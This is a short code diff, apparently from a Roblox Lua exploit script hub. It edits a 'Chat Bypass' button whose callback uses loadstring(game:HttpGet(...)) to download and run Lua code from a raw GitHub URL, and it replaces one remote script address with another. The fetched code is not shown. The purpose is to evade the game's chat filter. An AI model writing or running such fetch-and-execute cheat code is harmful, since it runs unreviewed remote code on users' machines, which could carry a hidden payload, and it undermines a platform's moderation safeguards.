@@ -2004,7 +2004,7 @@ ScriptsTab:AddButton({
     Name = "Chat Bypass",
     Callback = function()
         local script2 = [[
-             loadstring(game:HttpGet("https://raw.githubusercontent.com/AlgariBot/lua/refs/heads/Lua-Script-Executor/LocalNeverPatchedBypass.txt"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ffedex/characters/refs/heads/main/chars', true))()
             print("Chat Bypass Script executed")
         ]]
         loadstring(script2)()
